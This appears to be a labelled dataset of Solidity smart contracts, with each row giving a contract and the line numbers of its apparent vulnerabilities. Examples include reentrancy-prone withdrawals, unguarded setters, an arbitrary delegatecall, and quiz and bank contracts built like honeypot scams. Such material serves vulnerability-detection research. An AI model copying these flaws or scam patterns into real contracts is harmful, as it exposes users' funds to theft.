    function () public payable {
        etherBalance+=msg.value;
    }
    function getBalance() public view returns (uint) {
        return etherBalance;
    }
    function getAddBal() public view returns (uint) {
        return address(this).balance;
    }
    function placeBet(uint gameId, string betSide) payable public {
        require(msg.value!=0);
        etherBalance+=msg.value;
        current[gameId].placeBet.value(msg.value)(msg.sender, msg.value, betSide);
    }
    function placeBet(string gameId, string betSide) payable public {
        placeBet(references[StringYokes.zint_convert(gameId)], betSide);
    }
    function checkGameAmount(uint gameId) public view returns (uint) {
        return current[gameId].allSidesPledgedAmount();
    }
    function checkGameSideAmount(uint gameId, uint sideNum) public view returns (uint) {
        return current[gameId].checkSidePledge(sideNum);
    }
    function endGame(uint gameId, string winningSide, address beneficiary) public onlyAdmin {//returns (address[10], uint[10]) {
        current[gameId].dish(winningSide, beneficiary);
    }
    function endGame(uint gameId, uint winningId, address profit) public onlyAdmin {
        endGame(gameId, current[gameId].getStrFromId(winningId), profit);
    }
}","[46, 83]"
"    struct Audit {
        AuditStatus status;
        address owner;
        uint id;
        uint totalReward; // total reward shared b/w all auditors
        uint remainingReward; // keep track of how much reward is left
        uint stake; // required stake for each auditor in wei
        uint endTime; // scheduled end time for the audit
        uint maxAuditors; // max auditors allowed for this Audit
        address[] participants; // array of auditor that have staked
    }
    //=== Storage
    uint public stakePeriod = 90 days; // number of days to wait before stake can be withdrawn
    uint public maxAuditDuration = 365 days; // max amount of time for a security audit
    Audit[] public audits;
    mapping(address => Auditor) public auditors;
    //=== Owner related
    function transfer(address _to, uint _amountInWei) external onlyOwner {
        require(address(this).balance > _amountInWei);
        _to.transfer(_amountInWei);
    }
    function setStakePeriod(uint _days) external onlyOwner {
        stakePeriod = _days * 1 days;
    }
    function setMaxAuditDuration(uint _days) external onlyOwner {
        maxAuditDuration = _days * 1 days;
    }
    //=== Auditors
    function addAuditor(address _auditor) external onlyOwner {
        require(auditors[_auditor].addr == address(0)); // Only add if they're not already added
        auditors[_auditor].banned = false;
        auditors[_auditor].addr = _auditor;
        auditors[_auditor].completedAudits = 0;
        auditors[_auditor].totalEarned = 0;
        emit AddedAuditor(_auditor);
    }
    function banAuditor(address _auditor) external onlyOwner {
        require(auditors[_auditor].addr != address(0));
        auditors[_auditor].banned = true;
        emit BannedAuditor(_auditor);
    }
    function allowAuditor(address _auditor) external onlyOwner {
        require(auditors[_auditor].addr != address(0));
        auditors[_auditor].banned = false;
        emit AllowedAuditor(_auditor);
    }
    //=== Audits and Rewards
    function createAudit(uint _stake, uint _endTimeInDays, uint _maxAuditors) external payable onlyOwner {
        uint endTime = _endTimeInDays * 1 days;
        require(endTime < maxAuditDuration);
        require(block.timestamp + endTime * 1 days > block.timestamp);
        require(msg.value > 0 && _maxAuditors > 0 && _stake > 0);
        Audit memory audit;
        audit.status = AuditStatus.New;
        audit.owner = msg.sender;
        audit.id = audits.length;
        audit.totalReward = msg.value;
        audit.remainingReward = audit.totalReward;
        audit.stake = _stake;
        audit.endTime = block.timestamp + endTime;
        audit.maxAuditors = _maxAuditors;
        audits.push(audit); // push into storage
        emit CreatedAudit(audit.id);
    }
    function reviewAudit(uint _id) external onlyOwner {
        require(audits[_id].status == AuditStatus.InProgress);
        require(block.timestamp >= audits[_id].endTime);
        audits[_id].endTime = block.timestamp; // override the endTime to when it actually ended
        audits[_id].status = AuditStatus.InReview;
        emit ReviewingAudit(_id);
    }
    function rewardAuditor(uint _id, address _auditor, uint _reward) external onlyOwner {
        audits[_id].remainingReward.sub(_reward);
        audits[_id].status = AuditStatus.Completed;
        auditors[_auditor].totalEarned.add(_reward);
        auditors[_auditor].completedAudits.add(1);
        auditors[_auditor].canWithdrawStake[_id] = true; // allow them to withdraw their stake after stakePeriod
        _auditor.transfer(_reward);
        emit AuditorRewarded(_id, _auditor, _reward);
    }
    function slashStake(uint _id, address _auditor) external onlyOwner {
        require(auditors[_auditor].addr != address(0));
        require(auditors[_auditor].stakedInAudit[_id]); // participated in audit
        auditors[_auditor].canWithdrawStake[_id] = false;
        emit SlashedStake(_id, _auditor);
    }
    //=== User Actions
    function stake(uint _id) public payable {
        // Check conditions of the Audit
        require(msg.value == audits[_id].stake);
        require(block.timestamp < audits[_id].endTime);
        require(audits[_id].participants.length < audits[_id].maxAuditors);
        require(audits[_id].status == AuditStatus.New || audits[_id].status == AuditStatus.InProgress);
        // Check conditions of the Auditor
        require(auditors[msg.sender].addr == msg.sender && !auditors[msg.sender].banned); // auditor is authorized
        require(!auditors[msg.sender].stakedInAudit[_id]); //check if auditor has staked for this audit already
        // Update audit's states
        audits[_id].status = AuditStatus.InProgress;
        audits[_id].participants.push(msg.sender);
        // Update auditor's states
        auditors[msg.sender].stakedInAudit[_id] = true;
        auditors[msg.sender].stakedAudits.push(_id);
        emit AuditorStaked(_id, msg.sender, msg.value);
    }
    function withdrawStake(uint _id) public {
        require(audits[_id].status == AuditStatus.Completed);
        require(auditors[msg.sender].canWithdrawStake[_id]);
        require(block.timestamp >= audits[_id].endTime + stakePeriod);
        auditors[msg.sender].canWithdrawStake[_id] = false; //prevent replay attack
        address(msg.sender).transfer(audits[_id].stake); // do this last to prevent re-entrancy
        emit WithdrawedStake(_id, msg.sender, audits[_id].stake);
    }
    //=== Getters
    function auditorHasStaked(uint _id, address _auditor) public view returns(bool) {
        return auditors[_auditor].stakedInAudit[_id];
    }
    function auditorCanWithdrawStake(uint _id, address _auditor) public view returns(bool) {
        if(auditors[_auditor].stakedInAudit[_id] && auditors[_auditor].canWithdrawStake[_id]) {
            return true;
        }
        return false;
    }
    // return a list of ids that _auditor has staked in
    function getStakedAudits(address _auditor) public view returns(uint[]) {
        return auditors[_auditor].stakedAudits;
    }
    // return a list of auditors that participated in this audit
    function getAuditors(uint _id) public view returns(address[]) {","[20, 108]"
"pragma solidity ^0.4.20;
contract BLITZQUIZ
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract BLITZQUIZ
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function Setup_Game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract BLITZ_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract BLITZ_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract BLITZ_QUIZ
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.8.4;
contract BSCWinBulls {
    event myEvent(bytes);
    // Code position in storage is keccak256(""PROXIABLE"") = ""0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7""
    constructor(bytes memory constructData, address contractLogic) public {
        // save the code address
        assembly { // solium-disable-line
            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)
        }
        (bool success, bytes memory __ ) = contractLogic.delegatecall(constructData); // solium-disable-line
        emit myEvent(__);
        require(success, ""Construction failed"");
    }
    fallback() external payable {
        assembly { // solium-disable-line
            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)
            calldatacopy(0x0, 0x0, calldatasize())
            let success := delegatecall(gas(), contractLogic, 0x0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch success
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}",[10]
"pragma solidity ^0.4.25;
contract B_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function B_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
contract Bait {
    receive() external payable {}
    function bait(address _pickpocket) external {
        (bool success, ) = _pickpocket.delegatecall(abi.encodeWithSignature(""finesse(address)"", _pickpocket));
        require(success, ""Bait: finesse did not go thru :("");
    }
}",[6]
"*/
contract Bank {
    using SafeMath for uint256;
    mapping (address => uint256) public depositBears;
    mapping (address => uint256) public depositBulls;
    uint256 public currentDeadline;
    uint256 public lastDeadline = 1546257600;
    uint256 public countOfBears;
    uint256 public countOfBulls;
    uint256 public totalSupplyOfBulls;
    uint256 public totalSupplyOfBears;
    uint256 public totalCBCSupplyOfBulls;
    uint256 public totalCBCSupplyOfBears;
    uint256 public probabilityOfBulls;
    uint256 public probabilityOfBears;
    address public lastHero;
    address public lastHeroHistory;
    uint256 public jackPot;
    uint256 public winner;
    bool public finished = false;
    Bears public BearsContract;
    Bulls public BullsContract;
    CBCToken public CBCTokenContract;
    /*
    * @dev Constructor create first deadline
    */
    constructor() public {
        currentDeadline = block.timestamp + 60 * 60 * 24 * 3;
    }
    /**
    * @dev Setter the CryptoBossCoin contract address. Address can be set at once.
    * @param _CBCTokenAddress Address of the CryptoBossCoin contract
    */
    function setCBCTokenAddress(address _CBCTokenAddress) public {
        require(address(CBCTokenContract) == address(0x0));
        CBCTokenContract = CBCToken(_CBCTokenAddress);
    }
    /**
    * @dev Setter the Bears contract address. Address can be set at once.
    * @param _bearsAddress Address of the Bears contract
    */
    function setBearsAddress(address payable _bearsAddress) external {
        require(address(BearsContract) == address(0x0));
        BearsContract = Bears(_bearsAddress);
    }
    /**
    * @dev Setter the Bulls contract address. Address can be set at once.
    * @param _bullsAddress Address of the Bulls contract
    */
    function setBullsAddress(address payable _bullsAddress) external {
        require(address(BullsContract) == address(0x0));
        BullsContract = Bulls(_bullsAddress);
    }
    /**
    * @dev Getting time from blockchain for timer
    */
    function getNow() view public returns(uint){
        return block.timestamp;
    }
    /**
    * @dev Getting state of game. True - game continue, False - game stopped
    */
    function getState() view public returns(bool) {
        if (block.timestamp > currentDeadline) {
            return false;
        }
        return true;
    }
    /**
    * @dev Setting info about participant from Bears or Bulls contract
    * @param _lastHero Address of participant
    * @param _deposit Amount of deposit
    */
    function setInfo(address _lastHero, uint256 _deposit) public {
        require(address(BearsContract) == msg.sender || address(BullsContract) == msg.sender);
        if (address(BearsContract) == msg.sender) {
            require(depositBulls[_lastHero] == 0, ""You are already in bulls team"");
            if (depositBears[_lastHero] == 0)
                countOfBears++;
            totalSupplyOfBears = totalSupplyOfBears.add(_deposit.mul(90).div(100));
            depositBears[_lastHero] = depositBears[_lastHero].add(_deposit.mul(90).div(100));
        }
        if (address(BullsContract) == msg.sender) {
            require(depositBears[_lastHero] == 0, ""You are already in bears team"");
            if (depositBulls[_lastHero] == 0)
                countOfBulls++;
            totalSupplyOfBulls = totalSupplyOfBulls.add(_deposit.mul(90).div(100));
            depositBulls[_lastHero] = depositBulls[_lastHero].add(_deposit.mul(90).div(100));
        }
        lastHero = _lastHero;
        if (currentDeadline.add(120) <= lastDeadline) {
            currentDeadline = currentDeadline.add(120);
        } else {
            currentDeadline = lastDeadline;
        }
        jackPot = (address(this).balance.add(_deposit)).mul(10).div(100);
        calculateProbability();
    }
    /**
    * @dev Calculation probability for team's win
    */
    function calculateProbability() public {
        require(winner == 0 && getState());
        totalCBCSupplyOfBulls = CBCTokenContract.balanceOf(address(BullsContract));
        totalCBCSupplyOfBears = CBCTokenContract.balanceOf(address(BearsContract));
        uint256 percent = (totalSupplyOfBulls.add(totalSupplyOfBears)).div(100);
        if (totalCBCSupplyOfBulls < 1 ether) {
            totalCBCSupplyOfBulls = 0;
        }
        if (totalCBCSupplyOfBears < 1 ether) {
            totalCBCSupplyOfBears = 0;
        }
        if (totalCBCSupplyOfBulls <= totalCBCSupplyOfBears) {
            uint256 difference = totalCBCSupplyOfBears.sub(totalCBCSupplyOfBulls).div(0.01 ether);
            probabilityOfBears = totalSupplyOfBears.mul(100).div(percent).add(difference);
            if (probabilityOfBears > 8000) {
                probabilityOfBears = 8000;
            }
            if (probabilityOfBears < 2000) {
                probabilityOfBears = 2000;
            }
            probabilityOfBulls = 10000 - probabilityOfBears;
        } else {
            uint256 difference = totalCBCSupplyOfBulls.sub(totalCBCSupplyOfBears).div(0.01 ether);
            probabilityOfBulls = totalSupplyOfBulls.mul(100).div(percent).add(difference);
            if (probabilityOfBulls > 8000) {
                probabilityOfBulls = 8000;
            }",[64]
"*/
contract Bank {
    using SafeMath for uint256;
    mapping (address => uint256) public depositBears;
    mapping (address => uint256) public depositBulls;
    uint256 public currentDeadline;
    uint256 public lastDeadline = 60 * 60 * 24 * 7;
    uint256 public countOfBears;
    uint256 public countOfBulls;
    uint256 public totalSupplyOfBulls;
    uint256 public totalSupplyOfBears;
    uint256 public totalCBCSupplyOfBulls;
    uint256 public totalCBCSupplyOfBears;
    uint256 public probabilityOfBulls;
    uint256 public probabilityOfBears;
    address public lastHero;
    address public lastHeroHistory;
    uint256 public jackPot;
    uint256 public winner;
    bool public finished = false;
    Bears public BearsContract;
    Bulls public BullsContract;
    CBCToken public CBCTokenContract;
    /*
    * @dev Constructor create first deadline
    */
    constructor() public {
        currentDeadline = block.timestamp + 60 * 60 * 24 * 3;
    }
    /**
    * @dev Setter the CryptoBossCoin contract address. Address can be set at once.
    * @param _CBCTokenAddress Address of the CryptoBossCoin contract
    */
    function setCBCTokenAddress(address _CBCTokenAddress) public {
        require(address(CBCTokenContract) == address(0x0));
        CBCTokenContract = CBCToken(_CBCTokenAddress);
    }
    /**
    * @dev Setter the Bears contract address. Address can be set at once.
    * @param _bearsAddress Address of the Bears contract
    */
    function setBearsAddress(address payable _bearsAddress) external {
        require(address(BearsContract) == address(0x0));
        BearsContract = Bears(_bearsAddress);
    }
    /**
    * @dev Setter the Bulls contract address. Address can be set at once.
    * @param _bullsAddress Address of the Bulls contract
    */
    function setBullsAddress(address payable _bullsAddress) external {
        require(address(BullsContract) == address(0x0));
        BullsContract = Bulls(_bullsAddress);
    }
    /**
    * @dev Getting time from blockchain for timer
    */
    function getNow() view public returns(uint){
        return block.timestamp;
    }
    /**
    * @dev Getting state of game. True - game continue, False - game stopped
    */
    function getState() view public returns(bool) {
        if (block.timestamp > currentDeadline) {
            return false;
        }
        return true;
    }
    /**
    * @dev Setting info about participant from Bears or Bulls contract
    * @param _lastHero Address of participant
    * @param _deposit Amount of deposit
    */
    function setInfo(address _lastHero, uint256 _deposit) public {
        require(address(BearsContract) == msg.sender || address(BullsContract) == msg.sender);
        if (address(BearsContract) == msg.sender) {
            require(depositBulls[_lastHero] == 0, ""You are already in bulls team"");
            if (depositBears[_lastHero] == 0)
                countOfBears++;
            totalSupplyOfBears = totalSupplyOfBears.add(_deposit.mul(90).div(100));
            depositBears[_lastHero] = depositBears[_lastHero].add(_deposit.mul(90).div(100));
        }
        if (address(BullsContract) == msg.sender) {
            require(depositBears[_lastHero] == 0, ""You are already in bears team"");
            if (depositBulls[_lastHero] == 0)
                countOfBulls++;
            totalSupplyOfBulls = totalSupplyOfBulls.add(_deposit.mul(90).div(100));
            depositBulls[_lastHero] = depositBulls[_lastHero].add(_deposit.mul(90).div(100));
        }
        lastHero = _lastHero;
        if (currentDeadline.add(120) <= lastDeadline) {
            currentDeadline = currentDeadline.add(120);
        } else {
            currentDeadline = lastDeadline;
        }
        jackPot = (address(this).balance.add(_deposit)).mul(10).div(100);
        calculateProbability();
    }
    /**
    * @dev Calculation probability for team's win
    */
    function calculateProbability() public {
        require(winner == 0 && getState());
        totalCBCSupplyOfBulls = CBCTokenContract.balanceOf(address(BullsContract));
        totalCBCSupplyOfBears = CBCTokenContract.balanceOf(address(BearsContract));
        uint256 percent = (totalSupplyOfBulls.add(totalSupplyOfBears)).div(100);
        if (totalCBCSupplyOfBulls < 1 ether) {
            totalCBCSupplyOfBulls = 0;
        }
        if (totalCBCSupplyOfBears < 1 ether) {
            totalCBCSupplyOfBears = 0;
        }
        if (totalCBCSupplyOfBulls <= totalCBCSupplyOfBears) {
            uint256 difference = totalCBCSupplyOfBears.sub(totalCBCSupplyOfBulls).div(0.01 ether);
            probabilityOfBears = totalSupplyOfBears.mul(100).div(percent).add(difference);
            if (probabilityOfBears > 8000) {
                probabilityOfBears = 8000;
            }
            if (probabilityOfBears < 2000) {
                probabilityOfBears = 2000;
            }
            probabilityOfBulls = 10000 - probabilityOfBears;
        } else {
            uint256 difference = totalCBCSupplyOfBulls.sub(totalCBCSupplyOfBears).div(0.01 ether);
            probabilityOfBulls = totalSupplyOfBulls.mul(100).div(percent).add(difference);
            if (probabilityOfBulls > 8000) {
                probabilityOfBulls = 8000;
            }",[64]
"contract Bank {
    using SafeMath for uint256;
    mapping (address => uint256) public depositBears;
    mapping (address => uint256) public depositBulls;
    uint256 public currentDeadline;
    uint256 public lastDeadline;
    uint256 public countOfBears;
    uint256 public countOfBulls;
    uint256 public totalSupplyOfBulls;
    uint256 public totalSupplyOfBears;
    uint256 public totalCBCSupplyOfBulls;
    uint256 public totalCBCSupplyOfBears;
    uint256 public probabilityOfBulls;
    uint256 public probabilityOfBears;
    address public lastHero;
    address public lastHeroHistory;
    uint256 public jackPot;
    uint256 public winner;
    bool public finished = false;
    Bears public BearsContract;
    Bulls public BullsContract;
    CBCToken public CBCTokenContract;
    /*
    * @dev Constructor create first deadline
    */
    constructor() public {
        currentDeadline = block.timestamp + 60 * 60 * 24 * 3;
        lastDeadline = block.timestamp + 60 * 60 * 24 * 7;
    }
    /**
    * @dev Setter the CryptoBossCoin contract address. Address can be set at once.
    * @param _CBCTokenAddress Address of the CryptoBossCoin contract
    */
    function setCBCTokenAddress(address _CBCTokenAddress) public {
        require(address(CBCTokenContract) == address(0x0));
        CBCTokenContract = CBCToken(_CBCTokenAddress);
    }
    /**
    * @dev Setter the Bears contract address. Address can be set at once.
    * @param _bearsAddress Address of the Bears contract
    */
    function setBearsAddress(address payable _bearsAddress) external {
        require(address(BearsContract) == address(0x0));
        BearsContract = Bears(_bearsAddress);
    }
    /**
    * @dev Setter the Bulls contract address. Address can be set at once.
    * @param _bullsAddress Address of the Bulls contract
    */
    function setBullsAddress(address payable _bullsAddress) external {
        require(address(BullsContract) == address(0x0));
        BullsContract = Bulls(_bullsAddress);
    }
    /**
    * @dev Getting time from blockchain for timer
    */
    function getNow() view public returns(uint){
        return block.timestamp;
    }
    /**
    * @dev Getting state of game. True - game continue, False - game stopped
    */
    function getState() view public returns(bool) {
        if (block.timestamp > currentDeadline) {
            return false;
        }
        return true;
    }
    /**
    * @dev Setting info about participant from Bears or Bulls contract
    * @param _lastHero Address of participant
    * @param _deposit Amount of deposit
    */
    function setInfo(address _lastHero, uint256 _deposit) public {
        require(address(BearsContract) == msg.sender || address(BullsContract) == msg.sender);
        if (address(BearsContract) == msg.sender) {
            require(depositBulls[_lastHero] == 0, ""You are already in bulls team"");
            if (depositBears[_lastHero] == 0)
                countOfBears++;
            totalSupplyOfBears = totalSupplyOfBears.add(_deposit.mul(90).div(100));
            depositBears[_lastHero] = depositBears[_lastHero].add(_deposit.mul(90).div(100));
        }
        if (address(BullsContract) == msg.sender) {
            require(depositBears[_lastHero] == 0, ""You are already in bears team"");
            if (depositBulls[_lastHero] == 0)
                countOfBulls++;
            totalSupplyOfBulls = totalSupplyOfBulls.add(_deposit.mul(90).div(100));
            depositBulls[_lastHero] = depositBulls[_lastHero].add(_deposit.mul(90).div(100));
        }
        lastHero = _lastHero;
        if (currentDeadline.add(120) <= lastDeadline) {
            currentDeadline = currentDeadline.add(120);
        } else {
            currentDeadline = lastDeadline;
        }
        jackPot = (address(this).balance.add(_deposit)).mul(10).div(100);
        calculateProbability();
    }
    /**
    * @dev Calculation probability for team's win
    */
    function calculateProbability() public {
        require(winner == 0 && getState());
        totalCBCSupplyOfBulls = CBCTokenContract.balanceOf(address(BullsContract));
        totalCBCSupplyOfBears = CBCTokenContract.balanceOf(address(BearsContract));
        uint256 percent = (totalSupplyOfBulls.add(totalSupplyOfBears)).div(100);
        if (totalCBCSupplyOfBulls < 1 ether) {
            totalCBCSupplyOfBulls = 0;
        }
        if (totalCBCSupplyOfBears < 1 ether) {
            totalCBCSupplyOfBears = 0;
        }
        if (totalCBCSupplyOfBulls <= totalCBCSupplyOfBears) {
            uint256 difference = totalCBCSupplyOfBears.sub(totalCBCSupplyOfBulls).div(0.01 ether);
            probabilityOfBears = totalSupplyOfBears.mul(100).div(percent).add(difference);
            if (probabilityOfBears > 8000) {
                probabilityOfBears = 8000;
            }
            if (probabilityOfBears < 2000) {
                probabilityOfBears = 2000;
            }
            probabilityOfBulls = 10000 - probabilityOfBears;
        } else {
            uint256 difference = totalCBCSupplyOfBulls.sub(totalCBCSupplyOfBears).div(0.01 ether);
            probabilityOfBulls = totalSupplyOfBulls.mul(100).div(percent).add(difference);
            if (probabilityOfBulls > 8000) {
                probabilityOfBulls = 8000;
            }",[64]
"pragma solidity ^0.4.13;
contract BankDeposit {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    address Owner;
    function transferOwnership(address to) public onlyOwner {
        Owner = to;
    }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function setRelease(uint newDate) public {
        Date = newDate;
    }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public { return withdrawTo(msg.sender, amount); }
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}","[30, 46]"
"  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}
/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of ""user permissions"".
 */
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() public {
    owner = msg.sender;
  }
  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract BatchTransfer is Ownable {
    using SafeMath for uint256;
    event Withdraw(address indexed receiver, address indexed token, uint amount);
    event TransferEther(address indexed sender, address indexed receiver, uint256 amount);
    modifier checkArrayArgument(address[] _receivers, uint256[] _amounts) {
        require(_receivers.length == _amounts.length && _receivers.length != 0);
        _;
    }
    function batchTransferToken(address _token, address[] _receivers, uint256[] _tokenAmounts) public checkArrayArgument(_receivers, _tokenAmounts) {
        require(_token != address(0));
        ERC20 token = ERC20(_token);
        require(allowanceForContract(_token) >= getTotalSendingAmount(_tokenAmounts));
        for (uint i = 0; i < _receivers.length; i++) {
            require(_receivers[i] != address(0));
            require(token.transferFrom(msg.sender, _receivers[i], _tokenAmounts[i]));
        }
    }
    function batchTransferEther(address[] _receivers, uint[] _amounts) public payable checkArrayArgument(_receivers, _amounts) {
        require(msg.value != 0 && msg.value == getTotalSendingAmount(_amounts));
        for (uint i = 0; i < _receivers.length; i++) {
            require(_receivers[i] != address(0));
            _receivers[i].transfer(_amounts[i]);
            emit TransferEther(msg.sender, _receivers[i], _amounts[i]);
        }
    }
    function withdraw(address _receiver, address _token) public onlyOwner {
        ERC20 token = ERC20(_token);
        uint tokenBalanceOfContract = token.balanceOf(this);
        require(_receiver != address(0) && tokenBalanceOfContract > 0);
        require(token.transfer(_receiver, tokenBalanceOfContract));
        emit Withdraw(_receiver, _token, tokenBalanceOfContract);
    }
    function balanceOfContract(address _token) public view returns (uint) {
        ERC20 token = ERC20(_token);
        return token.balanceOf(this);
    }
    function allowanceForContract(address _token) public view returns (uint) {
        ERC20 token = ERC20(_token);
        return token.allowance(msg.sender, this);
    }
    function getTotalSendingAmount(uint256[] _amounts) private pure returns (uint totalSendingAmount) {
        for (uint i = 0; i < _amounts.length; i++) {
            require(_amounts[i] > 0);
            totalSendingAmount = totalSendingAmount.add(_amounts[i]);
        }
    }
}",[64]
"pragma solidity ^0.4.11;
library Math {
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
